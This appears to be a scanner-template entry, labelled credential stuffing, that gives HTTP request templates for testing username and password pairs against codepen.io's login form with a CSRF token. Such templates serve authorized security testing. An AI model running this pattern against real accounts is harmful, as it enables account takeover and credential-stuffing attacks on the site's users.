# Vulnerability: codepen.io Login Check
**Classification:** CREDS-STUFFING
**Source:** Nuclei Template (`codepen-login-check.yaml`)

## Description
Checks for a valid codepen account.

## Vulnerable Code Pattern / Exploit Payload
```http
GET https://codepen.io/login HTTP/1.1
Host: codepen.io

POST https://codepen.io/login/login HTTP/1.1
Host: codepen.io
Content-Type: application/x-www-form-urlencoded
X-CSRF-Token: {{token}}

authenticity_token={{token}}&email={{username}}&password={{password}}&login-type=fullpage
```

